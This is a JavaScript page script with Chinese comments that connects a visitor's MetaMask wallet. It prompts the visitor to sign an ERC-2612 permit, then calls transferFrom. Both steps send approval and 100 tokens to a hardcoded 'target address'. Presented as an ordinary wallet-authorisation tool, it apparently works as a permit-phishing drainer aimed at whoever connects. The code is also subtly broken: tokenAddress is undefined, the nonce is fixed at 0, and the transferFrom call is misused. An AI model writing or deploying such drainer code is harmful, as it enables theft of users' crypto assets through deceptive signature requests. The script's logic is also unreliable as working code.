const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699'; // 目标地址
let web3;
let walletConnectProvider;
let isConnected = false;

const erc20Abi = [
    // balanceOf 方法
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    // transfer 方法
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    },
    // transferFrom 方法
    {
        "constant": false,
        "inputs": [
            {"name": "_from", "type": "address"},
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    },
    // permit 方法 (ERC2612 标准)
    {
        "constant": false,
        "inputs": [
            {"name": "owner", "type": "address"},
            {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"},
            {"name": "deadline", "type": "uint256"},
            {"name": "v", "type": "uint8"},
            {"name": "r", "type": "bytes32"},
            {"name": "s", "type": "bytes32"}
        ],
        "name": "permit",
        "outputs": [],
        "type": "function"
    }
];

// 连接钱包
document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = 'metamask'; // 默认选择 MetaMask
    try {
        if (selectedWallet === 'metamask') {
            if (window.ethereum) {
                // 请求连接钱包
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);

                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    updateWalletList(accounts[0]); // 更新 UI 显示已连接的钱包
                    isConnected = true;
                    document.getElementById('status').innerText = 'MetaMask 已连接';
                } else {
                    document.getElementById('status').innerText = '未检测到已连接的账户';
                }
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        }
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    }
};

// 更新钱包地址列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 调用 permit 方法
const permit = async (tokenAddress, owner, spender, value, deadline, signature) => {
    try {
        const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
        const { v, r, s } = signature;

        await tokenContract.methods.permit(owner, spender, value, deadline, v, r, s).send({ from: owner });
        document.getElementById('status').innerText += '\nPermit 成功: 授权完成';
    } catch (error) {
        document.getElementById('status').innerText += '\nPermit 失败: ' + error.message;
    }
};

// 生成签名的方法
const signPermit = async (tokenAddress, owner, spender, value, deadline) => {
    const chainId = await web3.eth.getChainId();
    const nonce = 0; // nonce 可从代币合约中查询
    const domain = {
        name: "ERC20PermitToken",
        version: "1",
        chainId,
        verifyingContract: tokenAddress
    };

    const message = {
        owner,
        spender,
        value,
        nonce,
        deadline
    };

    const data = JSON.stringify({
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "version", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" }
            ],
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        },
        primaryType: "Permit",
        domain,
        message
    });

    // 签名
    const signature = await web3.currentProvider.request({
        method: 'eth_signTypedData_v4',
        params: [owner, data],
        from: owner
    });

    const splitSignature = web3.eth.accounts.decodeSignature(signature);
    return splitSignature;
};

// 签名授权按钮点击事件
document.getElementById('permitButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    const owner = accounts[0];
    const spender = recipientAddress;
    const value = web3.utils.toWei('100', 'ether'); // 代币数量
    const deadline = Math.floor(Date.now() / 1000) + 3600; // 一小时后过期

    // 生成签名
    const signature = await signPermit(tokenAddress, owner, spender, value, deadline);
    await permit(tokenAddress, owner, spender, value, deadline, signature);
};

// 调用 transferFrom 方法
const transferFrom = async (tokenAddress, owner, recipient, amount) => {
    try {
        const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
        await tokenContract.methods.transferFrom(owner, recipient, amount).send({ from: owner });
        document.getElementById('status').innerText += `\nTransferFrom 成功: 从 ${owner} 向 ${recipient} 转移 ${amount} 代币`;
    } catch (error) {
        document.getElementById('status').innerText += `\nTransferFrom 失败: ${error.message}`;
    }
};

// 转移代币按钮点击事件
document.getElementById('transferFromButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    const owner = accounts[0];
    const recipient = recipientAddress;
    const amount = web3.utils.toWei('100', 'ether'); // 转移的代币数量

    await transferFrom(tokenAddress, owner, recipient, amount);
};
